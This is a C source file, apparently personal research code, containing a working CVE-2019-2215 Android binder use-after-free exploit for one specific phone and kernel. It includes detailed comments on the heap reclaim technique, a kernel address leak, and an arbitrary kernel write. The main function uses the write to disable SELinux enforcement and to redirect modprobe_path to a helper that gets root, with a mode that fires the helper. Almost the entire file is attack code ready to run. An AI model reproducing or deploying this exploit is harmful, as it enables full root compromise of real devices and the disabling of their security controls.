/*
 * broot13 - CVE-2019-2215 arbitrary kernel write for Xplay6 (msm8996, 3.18.20, no KASLR).
 *
 * Established on this device by broot/broot11/broot12:
 *   armed state (unanswered sync BC_TRANSACTION to handle 0; todo drained so
 *   binder_has_thread_work()==false while transaction_stack!=NULL) makes binder_poll()
 *   call poll_wait(&thread->wait)  [binder.c:2142/2611/2625; wait@0x48, list@0x50/0x58 read
 *   out of this kernel's binder_poll, not guessed from source];
 *   BINDER_THREAD_EXIT kfree()s the thread unconditionally [binder.c:2776-2781];
 *   our 25-entry iovec array (400 bytes, kmalloc-512 like the 0x128 thread) reclaims the
 *   slot -- measured 6/6 and 7/8;
 *   the child's EPOLL_CTL_DEL then runs remove_wait_queue() over freed memory and its
 *   self-referential __list_del stores slot+0x50 into slot+0x50 and slot+0x58, so
 *   iov[5] = {base = slot+0x50 (kernel), len = that pointer (huge)};
 *   pipe writev copies with copy_from_user (kernel source accepted, so that segment leaks
 *   kernel memory), while socket receive copies with copy_to_user (range-checked, so a
 *   kernel destination is refused -- that is why broot9/broot12 wrote nothing at the
 *   target); and iov_iter does NOT re-read iov_len, so the poisoned segment swallows any
 *   later chunk.
 *
 * Therefore the writable window is "slot+0x50 for up to the end of the object", and we
 * need the slot's address.  Two rounds:
 *
 *   A (leak): park a writev on the pipe, let the child poison iov[5]; the first page the
 *     kernel delivers is the slot's own bytes at 0x50, whose first qword is slot+0x50
 *     itself -- the address, plus a positive confirmation that this array is the slot.
 *
 *   B (write): same construction, but the socket receive gets a single datagram:
 *     [0x50 installer bytes][plen payload bytes].  The installer overwrites slot+0x50..
 *     with a fresh segment pair at slot+0xb0 = {target, plen}.  The poisoned segment
 *     consumes its 0x50 bytes and the walk advances to slot+0xb0 -- a *user* address we
 *     install -- and the payload's plen bytes are copied there: an arbitrary kernel write
 *     with arbitrary data, at an address we control.
 *
 * Targets used: our own g_probe cell (probe, non-destructive), selinux_enforcing (4 zero
 * bytes), modprobe_path (24 bytes = our helper path).  RAM only, reboot restores.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ 0xc0306201
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40406300
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x80407203
#define BR_DEAD_REPLY 0x80007205

#define SEG_LOCK 4
#define SEG 5				/* iov[5] == slot+0x50: the poisoned pair */
#define IOV_SZ 25
#define SINK 0x50UL
#define BLK 0x1000UL
#define PAGE 0x1000UL
#define OBJ 0x128UL			/* sizeof(struct binder_thread) */

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define MODPROBE_PATH 0xffffffc001635a30UL
#define HELPER "/data/local/tmp/rootsh"

#define SEED 0x1122334455667788UL
#define HIT  0xCAFEBABEDEADBEEFUL

struct txn {
	unsigned long long target, cookie;
	unsigned int code, flags;
	int sender_pid;
	unsigned int sender_euid;
	unsigned long long data_size, offsets_size, buffer, offsets;
};
struct bwr {
	unsigned long long write_size, write_consumed, write_buffer;
	unsigned long long read_size, read_consumed, read_buffer;
};

static volatile unsigned long g_probe;
static char *fill, *sink;
static int g_cpu = 2;

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s))
		fprintf(stderr, "pin %d: %s\n", cpu, strerror(errno));
}

static int arm_pending_tx(int fd)
{
	struct txn t;
	struct bwr b;
	unsigned char wbuf[4 + sizeof(t)];
	char payload[16];
	int attempt;

	memset(payload, 0, sizeof payload);
	setvbuf(stdout, NULL, _IONBF, 0);
	memset(&t, 0, sizeof t);
	t.target = 0;
	t.code = 2;
	t.data_size = sizeof payload;
	t.buffer = (unsigned long long)(unsigned long)payload;
	memset(wbuf, 0, sizeof wbuf);
	*(unsigned int *)wbuf = BC_TRANSACTION;
	memcpy(wbuf + 4, &t, sizeof t);
	memset(&b, 0, sizeof b);
	b.write_size = sizeof wbuf;
	b.write_buffer = (unsigned long long)(unsigned long)wbuf;
	if (ioctl(fd, BINDER_WRITE_READ, &b))
		return -1;
	for (attempt = 0; attempt < 3; attempt++) {
		unsigned char rbuf[256];
		size_t off = 0;
		int complete = 0, reply = 0;

		memset(rbuf, 0, sizeof rbuf);
		memset(&b, 0, sizeof b);
		b.read_size = sizeof rbuf;
		b.read_buffer = (unsigned long long)(unsigned long)rbuf;
		if (ioctl(fd, BINDER_WRITE_READ, &b))
			return -1;
		while (off + 4 <= b.read_consumed) {
			unsigned int cmd;

			memcpy(&cmd, rbuf + off, 4);
			off += 4;
			if (cmd == BR_TRANSACTION_COMPLETE)
				complete = 1;
			else if (cmd == BR_REPLY || cmd == BR_DEAD_REPLY) {
				reply = 1;
				off += 64;
			}
		}
		if (complete && !reply)
			return 0;
		if (reply)
			return -1;
	}
	return -1;
}

static int read_enforce(void)
{
	unsigned char c = '?';
	int e = open("/sys/fs/selinux/enforce", O_RDONLY);
	int v = -1;

	if (e >= 0) {
		if (read(e, &c, 1) == 1)
			v = c - '0';
		close(e);
	}
	return v;
}

static int fire_trigger(void)
{
	unsigned char bad[8] = { 0x01, 0x01, 0x01, 0x01, 0, 0, 0, 0 };
	const char *p = "/data/local/tmp/badmagic";
	int fd, rc;

	unlink("/data/local/tmp/rootsh.ok");
	fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0)
		return perror("badmagic"), -1;
	if (write(fd, bad, sizeof bad) != (long)sizeof bad)
		perror("badmagic write");
	close(fd);
	chmod(p, 0755);
	rc = fork();
	if (rc == 0) {
		char *av[] = { (char *)p, NULL };
		execv(p, av);
		_exit(127);
	}
	if (rc > 0)
		waitpid(rc, NULL, 0);
	sleep(2);
	fd = open("/data/local/tmp/rootsh.ok", O_RDONLY);
	if (fd < 0) {
		printf("trigger: no rootsh.ok -> helper did not run\n");
		return -1;
	}
	close(fd);
	printf("trigger: rootsh.ok present -> helper ran\n");
	return 0;
}

/* round A: leak slot+0x50 -- broot's parked-writev structure, which is the part that
 * makes the difference: 1-page pipe, entry 3 supplies a dummy page the child consumes
 * BEFORE the DEL, so the writev is parked inside our array when the poison lands.
 */
static unsigned long long leak_round(void)
{
	unsigned long long got = 0, q[2];
	int i, tries = 12;

	for (i = 0; i < tries && !got; i++) {
		struct epoll_event ev = { .events = EPOLLIN };
		struct iovec iov[IOV_SZ];
		int fd, epfd, pipefd[2], leakp[2], r, status, j;
		pid_t kid;
		unsigned char *out = malloc(0x4000);
		unsigned char fwd[0x4000];
		ssize_t n, total = 0;

		fd = open("/dev/binder", O_RDONLY);
		epfd = epoll_create(1000);
		if (arm_pending_tx(fd) != 0) {
			close(fd); close(epfd);
			continue;
		}
		if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
			abort();
		if (pipe(pipefd) || pipe(leakp))
			abort();
		if (fcntl(pipefd[0], F_SETPIPE_SZ, (int)PAGE) != (int)PAGE)
			printf("  pipe=%d\n", fcntl(pipefd[0], F_SETPIPE_SZ, (int)PAGE));

		memset(iov, 0, sizeof iov);
		iov[SEG_LOCK - 1].iov_base = fill + (SEG_LOCK - 1) * BLK;
		iov[SEG_LOCK - 1].iov_len = PAGE;		/* dummy page drained first */
		iov[SEG_LOCK].iov_base = fill + SEG_LOCK * BLK;
		iov[SEG_LOCK].iov_len = 0;			/* spinlock word must read 0 */
		iov[SEG].iov_base = fill + SEG * BLK;
		iov[SEG].iov_len = 0x4000;			/* leak window */
		iov[SEG + 1].iov_base = fill + (SEG + 1) * BLK;
		iov[SEG + 1].iov_len = 0x10001;			/* absorbs the rest */
		(void)j;

		kid = fork();
		if (kid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL);
			pin(g_cpu ^ 1);
			close(pipefd[1]); close(leakp[0]);
			if (read(pipefd[0], fwd, PAGE) != (long)PAGE)
				_exit(6);
			if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
				_exit(7);
			while (total < 0x4000) {
				n = read(pipefd[0], fwd + total, 0x4000 - total);
				if (n <= 0)
					break;
				total += n;
			}
			write(leakp[1], fwd, total > 0 ? (size_t)total : 0);
			while (read(pipefd[0], fwd, sizeof fwd) > 0)
				;
			close(pipefd[0]); close(leakp[1]);
			_exit(0);
		}
		close(pipefd[0]); close(leakp[1]);
		if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
			printf("  THREAD_EXIT: %s\n", strerror(errno));
		r = (int)writev(pipefd[1], iov, IOV_SZ);
		{
			ssize_t got2 = 0;
			while (got2 < 0x4000) {
				n = read(leakp[0], (char *)out + got2, 0x4000 - got2);
				if (n <= 0)
					break;
				got2 += n;
			}
			memcpy(q, out, 16);
			printf("leak %d: writev=%d read=%zd q0=%#llx q1=%#llx %s\n", i, r,
			       got2, q[0], q[1],
			       (q[0] == q[1] && q[0] > 0xffffff8000000000ULL)
					? "<== slot+0x50" : "");
			if (q[0] == q[1] && q[0] > 0xffffff8000000000ULL)
				got = q[0];
		}
		waitpid(kid, &status, 0);
		close(pipefd[1]); close(leakp[0]);
		close(fd); close(epfd);
	}
	return got;
}

/* round B: one datagram = installer then payload, write plen bytes at tgt */
static int write_round(unsigned long long slot50, unsigned long long tgt, int plen,
                       const unsigned char *payload)
{
	struct epoll_event ev = { .events = EPOLLIN };
	struct iovec *iov;
	struct msghdr m;
	unsigned char *dg;
	size_t dglen = SINK + (size_t)plen;
	int fd, epfd, socks[2], r, status, ok = 0;
	pid_t kid;
	int k;

	iov = malloc(IOV_SZ * sizeof *iov);
	dg = calloc(1, dglen);
	if (!iov || !dg)
		abort();

	/* installer at slot+0x50: heal the poisoned pair into a bounded user sink, then put
	 * the real segment at slot+0xb0 (iov index 11).
	 */
	{
		unsigned long long *w = (unsigned long long *)dg;

		w[0] = (unsigned long long)(sink + 0x0000);	/* slot+0x50 iov[5].base */
		w[1] = SINK;				/* slot+0x58 iov[5].len: consumed */
		/* segments 6..11 get zero length so the walk skips them (proven to be
		 * skipped cleanly by broot11's dgram trace) and stops at segment 12, which
		 * is the pair we install at slot+0xc0 = {target, plen}.
		 */
		w[2] = (unsigned long long)(sink + 0x1000);	w[3] = 0;
		w[4] = (unsigned long long)(sink + 0x2000);	w[5] = 0;
		w[6] = (unsigned long long)(sink + 0x3000);	w[7] = 0;
		w[8] = (unsigned long long)(sink + 0x4000);	w[9] = 0;
		w[10] = (unsigned long long)(sink + 0x5000);	w[11] = 0;
		w[12] = (unsigned long long)(sink + 0x6000);	w[13] = 0;
		w[14] = tgt;					/* slot+0xc0 */
		w[15] = (unsigned long long)plen;		/* slot+0xc8 */
	}
	memcpy(dg + SINK, payload, plen);		/* the payload travels through slot+0xc0 */

	fd = open("/dev/binder", O_RDONLY);
	epfd = epoll_create(1000);
	if (arm_pending_tx(fd) != 0) {
		printf("write: arming failed\n");
		return -1;
	}
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
		abort();
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
		abort();
	{
		struct timeval tv = { .tv_sec = 6, .tv_usec = 0 };
		setsockopt(socks[0], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
	}

	kid = fork();
	if (kid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		pin(g_cpu ^ 1);
		close(socks[0]);
		usleep(150000);
		if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
			_exit(7);
		if (write(socks[1], dg, dglen) != (long)dglen)
			_exit(8);
		usleep(80000);
		close(socks[1]);
		_exit(0);
	}
	close(socks[1]);
	if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
		printf("  THREAD_EXIT: %s\n", strerror(errno));

	memset(iov, 0, IOV_SZ * sizeof *iov);
	iov[SEG_LOCK].iov_base = fill + SEG_LOCK * BLK;
	iov[SEG_LOCK].iov_len = 0;
	for (k = SEG; k < IOV_SZ; k++) {
		iov[k].iov_base = fill + k * BLK;
		iov[k].iov_len = 0x1000;
	}
	memset(&m, 0, sizeof m);
	m.msg_iov = iov;
	m.msg_iovlen = IOV_SZ;
	errno = 0;
	r = recvmsg(socks[0], &m, 0);
	printf("write: recvmsg=%d errno=%d seg5=%#llx idx11=%#llx idx12=%#llx\n",
	       r, errno, *(unsigned long long *)(fill + SEG * BLK),
	       *(unsigned long long *)(fill + 11 * BLK),
	       *(unsigned long long *)(fill + 12 * BLK));

	waitpid(kid, &status, 0);
	close(socks[0]);
	close(fd);
	close(epfd);
	return ok;
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "probe";
	unsigned long long slot50, tgt;
	unsigned char payload[64];
	int plen, ok = 0;

	if (!strcmp(mode, "trigger"))
		return fire_trigger() ? 1 : 0;

	pin(g_cpu);
	fill = malloc(IOV_SZ * BLK);
	sink = malloc(0x10000);
	if (!fill || !sink)
		abort();
	memset(fill, 0, IOV_SZ * BLK);
	memset(sink, 0, 0x10000);
	memset(payload, 0, sizeof payload);
	setvbuf(stdout, NULL, _IONBF, 0);

	if (argc > 2)
		slot50 = strtoull(argv[2], NULL, 0);
	else
		slot50 = leak_round();
	if (!slot50) {
		printf("no slot learned; nothing to do\n");
		return 1;
	}

	if (!strcmp(mode, "probe")) {
		tgt = (unsigned long long)&g_probe;
		plen = 8;
		g_probe = SEED;
		{
			unsigned long long v = HIT;
			memcpy(payload, &v, 8);
		}
		printf("target g_probe=%#llx slot50=%#llx\n", tgt, slot50);
		write_round(slot50, tgt, plen, payload);
		ok = (g_probe == HIT);
		printf("probe now = %#lx -> %s\n", g_probe, ok ? "MOVED" : "unchanged");
	} else if (!strcmp(mode, "enforce")) {
		tgt = SELINUX_ENFORCING;
		plen = 4;
		memset(payload, 0, 4);
		write_round(slot50, tgt, plen, payload);
		sleep(1);
		ok = (read_enforce() == 0);
		printf("selinux_enforcing readback=%d -> %s\n", read_enforce(),
		       ok ? "PERMISSIVE" : "still enforcing");
	} else if (!strcmp(mode, "path")) {
		tgt = MODPROBE_PATH;
		plen = 24;
		memcpy(payload, HELPER, 22);
		write_round(slot50, tgt, plen, payload);
		printf("path: wrote helper path; verify with trigger\n");
		ok = 1;
	} else {
		printf("unknown mode %s\n", mode);
		return 2;
	}
	printf("RESULT %s\n", ok ? "HIT" : "MISS");
	return ok ? 0 : 1;
}
